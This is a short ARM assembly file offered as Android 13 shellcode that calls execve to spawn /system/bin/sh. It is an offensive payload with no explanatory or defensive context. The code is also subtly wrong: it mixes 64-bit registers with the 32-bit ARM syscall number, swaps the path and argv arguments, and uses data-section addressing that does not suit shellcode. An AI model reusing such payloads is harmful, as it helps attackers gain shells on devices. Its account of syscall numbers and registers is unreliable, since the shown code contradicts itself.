; Android 13 ARM execve Shellcode
.section .data
shell_path: .asciz "/system/bin/sh"
.section .text
.global _start
_start:
    mov x0, #0          @ argv set to NULL
    ldr x1, =shell_path @ pointer to "/system/bin/sh"
    mov x2, #0          @ envp set to NULL
    mov x8, #11         @ sys_execve (11 on ARM Linux-based systems)
    svc 0               @ make syscall